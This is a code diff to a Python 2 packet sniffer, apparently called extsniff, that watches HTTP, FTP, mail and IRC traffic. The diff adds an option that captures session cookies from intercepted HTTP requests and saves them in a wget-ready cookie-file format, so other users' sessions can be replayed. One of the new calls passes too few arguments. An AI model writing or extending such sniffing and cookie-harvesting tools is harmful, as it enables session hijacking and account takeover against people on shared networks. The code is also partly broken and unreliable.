@@ -52,6 +52,7 @@ whiteList = list() # List of excluded hosts
 blackList = list() # Sniff only blacklisted hosts
 bIP_LEN = 0
 wIP_LEN = 0
+saveAllCookies = False
 
 # DEFAULT PORTS
 PORTS = dict()
@@ -103,7 +104,7 @@ def printUsage():
     print "  -h, --help             : display this help"
     print "  -c, --console          : don't fork into background"
     print "  -d, --debug            : switch to debug log level"
-    print "  -p, --print-cookies    : print all cookies"
+    print "  -p, --print-all        : print GET, POST requests and responses"
 #    print "  -f,                    : filter printed cookies and save to file (does not filter console output)"
     print "  -m,                    : load modules (comma separated)"
     print "  -x, --disable-http     : dont listen on HTTP port 80 (tcp port http)"
@@ -117,11 +118,12 @@ def printUsage():
     print "  -q, --enable-irc       : listen on 6667 and 6666 IRC ports"
     print "  -w, --whitelist        : dont capture packets from whitelisted MAC/IP adresses"
     print "  -b, --blacklist        : capture packets only from blacklisted IP adresses"
+    print "  -k, --cookies          : capture and save cookies to file in /root/.extsniff/cookies/ directory"
     print ""
     exit(0);
 
 try:
-    opts, args = getopt.getopt(sys.argv[1:], 'qsrxfcdpholb:w:u:i:m:', ['print-cookies', 'console','debug','help', 'disable-http', 'disable-ftp', 'enable-pop3', 'enable-smtp', 'enable-stdout', 'disable-logging', 'log-file=', 'iface=', 'enable-irc', 'whitelist=', 'blacklist'])
+    opts, args = getopt.getopt(sys.argv[1:], 'qsrxfcdphkolb:w:u:i:m:', ['print-cookies', 'console','debug','help', 'disable-http', 'disable-ftp', 'enable-pop3', 'enable-smtp', 'enable-stdout', 'disable-logging', 'log-file=', 'iface=', 'enable-irc', 'whitelist=', 'blacklist', 'cookies'])
 except getopt.error, msg:
     print msg
     print 'for help use --help'
@@ -132,48 +134,77 @@ for o, a in opts:
     if o in ('-h', '--help'):
         printUsage()
         exit(2)
+
     if o in ('-d', '--debug'):
         debugMode=True
+
     if o in ('-c', '--console'):
         consoleMode=True
-    if o == "-m":
-        additionalModules=a
-    if o in ('-p', '--print-cookies'):
-        printCookies=True
+
+#===============================================================#
+#===================  OUTPUT CONFIGURATION  ====================#
+#===============================================================#
+
     if o in ('-x', '--disable-http'):
         expr = expr.replace('tcp port http', '')
-    if o in ('-f', '--enable-ftp'):
-        if expr == 'tcp port http':
-           expr = 'tcp port http or tcp port ftp'
-        elif expr == '':
-           expr = 'tcp port ftp'
-    if o in ('-r', '--enable-pop3'):
-        if expr == '':
-           expr = 'tcp port '+str(PORTS['POP3'])
-        else:
-           expr = expr+" or tcp port "+str(PORTS['POP3'])
-    if o in ('-s', '--enable-smtp'):
-        if expr == '':
-           expr = 'tcp port '+str(PORTS['SMTP'])
-        else:
-           expr = expr+" or tcp port "+str(PORTS['SMTP'])
-    if o in ('-o', '--enable-stdout'):
-        printMode=True
-    if o in ('-l', '--disable-logging'):
-        logOutput=True
-    if o in ('-i', '--iface'):
-        conf.iface=a
-    if o in ('-q', '--enable-irc'):
-        if expr == '':
-           expr = 'tcp port 6667 or tcp port 6666'
-        else:
-           expr = expr+" or tcp port 6667 or tcp port 6666"
+
+    if o == "-m":
+        additionalModules=a
+
+    if o in ('-p', '--print-all'):
+        printCookies=True
+
     if o in ('-u', '--log-file'):
         # check if directory is writable
         if not os.access(a, os.W_OK):
             print "CRITICAL ERROR: Selected log file is not writable!"
             exit(0)
         LOGFILE = a
+
+    if o in ('-o', '--enable-stdout'):
+        printMode=True
+
+    if o in ('-l', '--disable-logging'):
+        logOutput=True
+
+    if o in ('-i', '--iface'):
+        conf.iface=a
+
+    if o in ('-k', '--cookies'):
+        saveAllCookies=True
+
+#===============================================================#
+#====================  PROTOCOL SELECTION  =====================#
+#===============================================================#
+
+    if o in ('-f', '--enable-ftp'):
+        if expr == 'tcp port http':
+           expr = 'tcp port http or tcp port ftp'
+        elif expr == '':
+           expr = 'tcp port ftp'
+
+    if o in ('-r', '--enable-pop3'):
+        if expr == '':
+           expr = 'tcp port '+str(PORTS['POP3'])
+        else:
+           expr = expr+" or tcp port "+str(PORTS['POP3'])
+
+    if o in ('-q', '--enable-irc'):
+        if expr == '':
+           expr = 'tcp port 6667 or tcp port 6666'
+        else:
+           expr = expr+" or tcp port 6667 or tcp port 6666"
+
+    if o in ('-s', '--enable-smtp'):
+        if expr == '':
+           expr = 'tcp port '+str(PORTS['SMTP'])
+        else:
+           expr = expr+" or tcp port "+str(PORTS['SMTP'])
+
+#===============================================================#
+#================  PACKET FILTERING BY MAC/IP  =================#
+#===============================================================#
+
     if o in ('-w', '--whitelist'):
         if os.path.isfile(a) and os.access(a, os.W_OK):
             FileHandler = open(a, "r")
@@ -183,6 +214,7 @@ for o, a in opts:
             whiteList = readIPFromArray(a)
 
         wIP_LEN = len(blackList)
+
     if o in ('-b', '--blacklist'):
         if os.path.isfile(a) and os.access(a, os.W_OK):
             FileHandler = open(a, "r")
@@ -200,6 +232,10 @@ if expr == '':
 if additionalModules != False and additionalModules != '*' and additionalModules != 'all':
     smodules = additionalModules.split(',')
     userdir=str(os.popen('cd ~; pwd').read()).replace("\n", '')
+
+    if not os.path.exists(str(userdir)+"/.extsniff/smods/"):
+        os.mkdir(str(userdir)+"/.extsniff/smods/")
+
     sys.path.append(str(userdir)+"/.extsniff/smods/")
 
     for smodule in smodules:
@@ -453,8 +489,57 @@ def parseSMTPData(raw, ipsrc, ipdst, sport, dport):
         except KeyError:
             True
 
+def makeWgetFromHTTPCookies(a, Domain, DefaultPath="/"):
+    AllCookies = "" # RESULT
+    CookieList = a.split(';');
+
+    ElementID = 0
+    CountOfCookies = len(CookieList)
+
+    for Element in CookieList:
+        ElementID = ElementID+1
+        # STRIP NEW LINES
+        Element = Element.replace("\n", "")
+
+        while Element[0:1] == " ": # STRIP WHITE SPACES FROM BEGINNING OF STRING
+            Element = Element[1:]
+
+        CookieSyntax = Element.split("=");
+
+        if len(CookieSyntax) > 0:
+            SimpleCookieString = Domain+"	TRUE	"+DefaultPath+"	FALSE	0	"+CookieSyntax[0]+"	"
+                
+
+            # if the cookie is more complicated (too many "=")
+            if len(CookieSyntax) > 2:
+                for CookieSyntaxValue in CookieSyntax:
+                    if CookieSyntaxValue == CookieSyntax[0]:
+                        continue
+
+                    SimpleCookieString=SimpleCookieString+"="+CookieSyntaxValue
+            else:
+                SimpleCookieString = SimpleCookieString+CookieSyntax[1] # for simple cookie its not complicated, it has "one value"
+
+        if ElementID == CountOfCookies:
+            AllCookies = AllCookies+SimpleCookieString
+        else:
+            AllCookies = AllCookies+SimpleCookieString+"\n"
+
+    return AllCookies
+
     
 
+def cookiesToFile(URL, Cookies, ipdst, ipsrc):
+    from urlparse import urlparse # IMPORT LIB
+    o = urlparse("http://"+URL) # PARSE URL
+
+    if not os.path.exists("/root/.extsniff/cookies/"):
+        os.mkdir("/root/.extsniff/cookies/")
+
+    if not os.path.exists("/root/.extsniff/cookies/"+str(o.netloc+ipdst+ipsrc)) and not os.path.exists("/root/.extsniff/cookies/"+str(o.netloc+ipsrc+ipdst)):
+        FileHandler = open("/root/.extsniff/cookies/"+str(o.netloc+ipdst+ipsrc), "w")
+        FileHandler.write(makeWgetFromHTTPCookies(Cookies, o.netloc.replace("www", ""), ""))
+        FileHandler.close()
     
 
 ########################
@@ -467,7 +552,7 @@ LastGETRequest = False
 def parseHTTPData(raw, ipsrc, ipdst, sport, dport, pkt):
     ''' Parse HTTP Data, Requests/Responses, GET and POST '''
 
-    global printCookies, POSTData, LastGETRequest
+    global printCookies, POSTData, LastGETRequest, saveAllCookies
     # check if its request or response
     if re.findall('HTTP/1.1 200 OK', raw):
         DataType = 'http:response'
@@ -527,6 +612,10 @@ def parseHTTPData(raw, ipsrc, ipdst, sport, dport, pkt):
                 printMessage(Headers['method']+": "+URL+"\n* User-Agent: "+Headers['headers']['user-agent'][0]+"\n* Referer: "+Headers['headers']['referer'][0]+"\n* Cookies: "+Headers['headers']['cookie'][0]+"\n\n")
             except KeyError:
                 True
+
+        if saveAllCookies == True:
+            cookiesToFile(URL, Headers['headers']['cookie'][0])
+
     elif DataType == 'http:request:GET':
         Headers = parseHeader(raw, 'request')
 
@@ -568,6 +657,9 @@ def parseHTTPData(raw, ipsrc, ipdst, sport, dport, pkt):
                 printMessage(Headers['method']+": "+LastGETRequest+"\n* User-Agent: "+Headers['headers']['user-agent'][0]+"\n* Referer: "+Headers['headers']['referer'][0]+"\n* Cookies: "+Headers['headers']['cookie'][0]+"\n\n")
             except KeyError:
                 True
+
+        if saveAllCookies == True:
+            cookiesToFile(LastGETRequest, Headers['headers']['cookie'][0], ipdst, ipsrc)
 
 
     elif DataType == 'http:response':
